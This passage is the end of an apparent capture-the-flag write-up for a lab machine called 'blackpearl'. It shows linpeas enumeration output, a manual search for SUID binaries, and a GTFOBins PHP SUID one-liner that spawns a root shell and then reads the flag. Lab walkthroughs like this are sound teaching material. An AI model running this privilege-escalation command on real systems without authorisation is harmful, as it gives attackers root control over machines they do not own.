                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...


═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
strings Not Found                                                                                                                                                                                                                           
strace Not Found                                                                                                                                                                                                                            
-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                   
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd

< ---- SNIP ---- >
~~~
Linpeas identified an unknown SUID binary for PHP7.3. Let's see if I can enumerate this manually as well by entering the following command: **find / -user root -perm -4000 -print 2>/dev/null**


~~~
alek@blackpearl:/tmp$ find / -user root -perm -4000 -print 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.3
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
alek@blackpearl:/tmp$ 
~~~
Searching on [GTFObins for PHP SUID](https://gtfobins.github.io/gtfobins/php/#suid) I found a route to gain shell as root.
First I declare a variable CMD with the **/bin/sh** binary.
~~~
alek@blackpearl:/tmp$ CMD="/bin/sh"
~~~
Next I run the binary as described on GTFObins to gain a shell as root with the following command: **/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"**
After that step I check who I am on the machine.
~~~
alek@blackpearl:/tmp$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami;id;hostname;pwd;ls
root
uid=1000(alek) gid=1000(alek) euid=0(root) groups=1000(alek),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
blackpearl
/tmp
linpeas.sh  systemd-private-f15b5fbf78534a59a3786d3ef2c108b8-systemd-timesyncd.service-SqGq39
~~~
Since I am root, I can capture the root flag under the root directory.
~~~
# cd /root
# ls
flag.txt
~~~
The flag has been found, now have a look to see what it says.
~~~
# cat flag.txt  
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
# 
~~~
Yes the flag has been captured. A box that is not very difficult, but it is still educational.